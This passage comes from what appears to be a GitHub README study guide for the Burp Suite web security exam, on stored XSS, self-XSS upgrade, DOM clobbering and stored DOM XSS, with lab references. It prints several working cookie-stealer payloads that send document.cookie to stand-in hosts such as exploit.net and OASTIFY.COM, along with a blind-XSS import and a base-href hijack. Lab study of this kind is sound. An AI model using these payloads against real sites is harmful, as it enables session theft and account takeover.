1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eStored XSS can also be Blind XSS.\nIf alert payload do not trigger, see \u003ca href=\"https://youtu.be/QSiXHb97E1c?si=ta4Rro6J39QlqVCR\u0026amp;t=428\" rel=\"nofollow\"\u003eNahamSec blind xss video\u003c/a\u003e payload for victim to click, example: \u003ccode\u003e\u0026lt;svg/onload=import('//EXPLOIT.net/blind_xss')\u0026gt;\u003c/code\u003e\u003cbr\u003e\nIf stored input is redirecting victim that click on the links, it send request to exploit server.\nUse the following sample code to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e stored XSS.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;img src=\u0026quot;https://EXPLOIT.net/img\u0026quot;\u0026gt;\n\u0026lt;script src=\u0026quot;https://EXPLOIT.net/script\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\n\u0026lt;video src=\u0026quot;https://EXPLOIT.net/video\u0026quot;\u0026gt;\u0026lt;/video\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eimg\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://EXPLOIT.net/img\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://EXPLOIT.net/script\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003evideo\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://EXPLOIT.net/video\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003evideo\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBelow log entries show the requests made to the exploit server, and from the logs we can \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e that \u003ccode\u003e/img\u003c/code\u003e and \u003ccode\u003e/video\u003c/code\u003e of the above tags were allowed on the application and made requests when accessed.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-stored-xss.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-stored-xss.png\" alt=\"Identify-stored-xss\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCross site Scripting saved in Blog post comment. This Cookie Stealer payload then send the victim session cookie to the exploit server logs.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;img src=\u0026quot;1\u0026quot; onerror=\u0026quot;window.location='https://exploit.net/cookie='+document.cookie\u0026quot;\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eimg\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003e1\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003eonerror\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ewindow.location='https://exploit.net/cookie='+document.cookie\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eProduct and Store lookup\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"?productId=1\u0026amp;storeId=\u0026quot;\u0026gt;\u0026lt;/select\u0026gt;\u0026lt;img src=x onerror=this.src='https://exploit.net/?'+document.cookie;\u0026gt;\"\u003e\u003cpre\u003e?productId=1\u0026amp;storeId=\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003eselect\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eimg\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003ex\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eonerror\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003ethis.src\u003c/span\u003e='https://exploit.net/?'+document.cookie;\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eStored XSS Blog Post\u003c/h4\u003e\u003ca id=\"user-content-stored-xss-blog-post\" class=\"anchor\" aria-label=\"Permalink: Stored XSS Blog Post\" href=\"#stored-xss-blog-post\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eStored XSS Blog post cookie stealer sending document cookie to exploit server.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\ndocument.write('\u0026lt;img src=\u0026quot;https://exploit.net?cookieStealer='+document.cookie+'\u0026quot; /\u0026gt;');\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\ndocument.write('\u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eimg\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"https://exploit.net?cookieStealer='+document.cookie+'\"\u003c/span\u003e \u003cspan class=\"pl-kos\"\u003e/\u0026gt;\u003c/span\u003e');\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBelow target has a stored XSS vulnerability in the blog comments function. Steal a victim user session cookie that views the comments after they are posted, and then use their cookie to do impersonation.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/stored-xss-blog-post.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/stored-xss-blog-post.png\" alt=\"Stored XSS Blog post\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eFetch API\u003c/strong\u003e JavaScript Cookie Stealer payload in Blog post comment.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\nfetch('https://exploit.net', {\nmethod: 'POST',\nmode: 'no-cors',\nbody:document.cookie\n});\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\nfetch('https://exploit.net', \u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003emethod\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'POST'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003emode\u003c/span\u003e: \u003cspan class=\"pl-s\"\u003e'no-cors'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e,\u003c/span\u003e\n\u003cspan class=\"pl-s1\"\u003ebody\u003c/span\u003e:\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ecookie\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e);\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://youtu.be/UqDdR10F54A?si=nkhilLzyKQcfqtfU\u0026amp;t=1737\" rel=\"nofollow\"\u003eIPPSEC YouTube using the HackTheBox Bookworm\u003c/a\u003e, showing \u003ccode\u003epayload.js\u003c/code\u003e JavaScript code how he using \u003ccode\u003efetch\u003c/code\u003e and learning JavaScript.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting cross-site scripting to steal cookies\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eUpgrade stored self-XSS\u003c/h4\u003e\u003ca id=\"user-content-upgrade-stored-self-xss\" class=\"anchor\" aria-label=\"Permalink: Upgrade stored self-XSS\" href=\"#upgrade-stored-self-xss\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBlog comment with \u003cstrong\u003eStored self-XSS\u003c/strong\u003e, upgrading the payload to steal victim information from DOM. The function \u003cstrong\u003eedit content\u003c/strong\u003e reflect the input in the \u003ccode\u003e\u0026lt;script\u0026gt;\u003c/code\u003e tag. The CSRF token for the \u003cstrong\u003ewrite comment\u003c/strong\u003e is same as the \u003cstrong\u003eedit content\u003c/strong\u003e functions. Below payload use \u003cstrong\u003ewrite comment\u003c/strong\u003e function to make the victim create a blog entry on their on blog with our malicious content.\nThe \u003ccode\u003ea\u003c/code\u003e character is added to escape the \u003ccode\u003e#\u003c/code\u003e hash character from the initial application \u003ccode\u003esource code\u003c/code\u003e.\nThe below \u003ccode\u003esource code\u003c/code\u003e in the blog entry is full exploit to steal victim info.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;button form=comment-form formaction=\u0026quot;/edit\u0026quot; id=share-button\u0026gt;Click Button\u0026lt;/button\u0026gt;\n\u0026lt;input form=comment-form name=content value='\u0026lt;meta http-equiv=\u0026quot;refresh\u0026quot; content=\u0026quot;1; URL=/edit\u0026quot; /\u0026gt;'\u0026gt;\n\u0026lt;input form=comment-form name=tags value='a\u0026quot;);alert(document.getElementsByClassName(\u0026quot;navbar-brand\u0026quot;)[0].innerText)//'\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebutton\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eform\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003ecomment-form\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eformaction\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003e/edit\u003c/span\u003e\" \u003cspan class=\"pl-c1\"\u003eid\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003eshare-button\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003eClick Button\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003ebutton\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eform\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003ecomment-form\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ename\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003econtent\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003evalue\u003c/span\u003e='\u003cspan class=\"pl-s\"\u003e\u0026lt;meta http-equiv=\"refresh\" content=\"1; URL=/edit\" /\u0026gt;\u003c/span\u003e'\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003einput\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eform\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003ecomment-form\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003ename\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003etags\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003evalue\u003c/span\u003e='\u003cspan class=\"pl-s\"\u003ea\");alert(document.getElementsByClassName(\"navbar-brand\")[0].innerText)//\u003c/span\u003e'\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThis target is exploited by constructing an HTML injection that clobbers a variable named \u003ccode\u003eshare_button\u003c/code\u003e, see \u003ccode\u003esource code\u003c/code\u003e below and uses HTML code above. The content is reflected on the page, then using this reflection enable page redirection to victim \u003ccode\u003e/edit\u003c/code\u003e page with the use of the \u003ccode\u003emeta http-equiv\u003c/code\u003e tag to refresh page after 1 second result in redirection.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/clobbering5.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/clobbering5.png\" alt=\"clobbering javascript variable\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"https://challenge-1222.intigriti.io/blog/unique-guid-value-abc123?share=1\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ehttps://challenge-1222.intigriti.io/blog/unique-guid-value-abc123?share=1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eDeliver Exploit, by Sending url that reference the above blog entry to the victim will trigger XSS as them.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://youtu.be/FowbZ8IlU7o\" rel=\"nofollow\"\u003eintigriti - Self-XSS upgrade - Solution to December 22 XSS Challenge\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAlternative exploit using HTML injection in the Edit Content blog entry page, \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e using \u003ca href=\"#xss-resources\"\u003eXSS Resources CSP check\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;base href=\u0026quot;https://Exploit.net\u0026quot;\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;base href=\"https://Exploit.net\"\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eHost JS file on Exploit server as \u003ccode\u003estatic/js/bootstrap.bundle.min.js\u003c/code\u003e, with content:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"alert(document.getElementsByClassName(\u0026quot;navbar-brand\u0026quot;)[0].innerText)\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ealert(document.getElementsByClassName(\"navbar-brand\")[0].innerText)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe modified PortSwigger lab payload assign the \u003ccode\u003edocument.location\u003c/code\u003e function to the variable \u003ccode\u003edefaultAvatar\u003c/code\u003e next time page is loaded, because site uses DOMPurify that allows the use of \u003ccode\u003ecid:\u003c/code\u003e protocol that do not URLencode double quotes.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;a id=defaultAvatar\u0026gt;\u0026lt;a id=defaultAvatar name=avatar href=\u0026quot;cid:\u0026amp;quot;onerror=document.location=`https://OASTIFY.COM/?clobber=`+document.cookie//\u0026quot;\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;a id=defaultAvatar\u0026gt;\u0026lt;a id=defaultAvatar name=avatar href=\"cid:\u0026amp;quot;onerror=document.location=`https://OASTIFY.COM/?clobber=`+document.cookie//\"\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting DOM clobbering to enable XSS\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eStored DOM XSS\u003c/h3\u003e\u003ca id=\"user-content-stored-dom-xss\" class=\"anchor\" aria-label=\"Permalink: Stored DOM XSS\" href=\"#stored-dom-xss\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn the JavaScript \u003ccode\u003esource code\u003c/code\u003e, included script \u003ccode\u003eresources/js/loadCommentsWithVulnerableEscapeHtml.js\u003c/code\u003e we \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the \u003ccode\u003ehtml.replace()\u003c/code\u003e function inside the custom \u003ccode\u003eloadComments\u003c/code\u003e function. Testing payloads we see the function only replaces the first occurrence of \u003ccode\u003e\u0026lt;\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/stored-dom-xss-code.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/stored-dom-xss-code.png\" alt=\"stored dom-xss code replace\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;\u0026gt;\u0026lt;img src=1 onerror=javascript:fetch(`https://OASTIFY.COM?escape=`+document.cookie)\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eimg\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e1\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eonerror\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003ejavascript:fetch(`https://OASTIFY.COM?escape\u003c/span\u003e=`+document.cookie)\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAbove payload is stored and any user visiting the comment blog will result in their session cookie being stolen and send to collaborator.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/stored-dom-xss-json-comments.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/stored-dom-xss-json-comments.png\" alt=\"stored DOM-XSS json comments\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePortSwigger Lab payload: \u003ccode\u003e\u0026lt;\u0026gt;\u0026lt;img src=1 onerror=alert()\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored\" rel=\"nofollow\"\u003ePortSwigger Lab: Stored DOM XSS\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eWeb Cache Poison\u003c/h2\u003e\u003ca id=\"user-content-web-cache-poison\" class=\"anchor\" aria-label=\"Permalink: Web Cache Poison\" href=\"#web-cache-poison\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#unkeyed-header\"\u003eUnkeyed header\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#unkeyed-utm_content\"\u003eUnkeyed Utm_content\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#cloaking-utm_content\"\u003eCloaking utm_content\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#poison-ambiguous-request\"\u003ePoison ambiguous request\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#cache-poison-multiple-headers\"\u003eCache Poison multiple headers\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eUnkeyed header\u003c/h3\u003e\u003ca id=\"user-content-unkeyed-header\" class=\"anchor\" aria-label=\"Permalink: Unkeyed 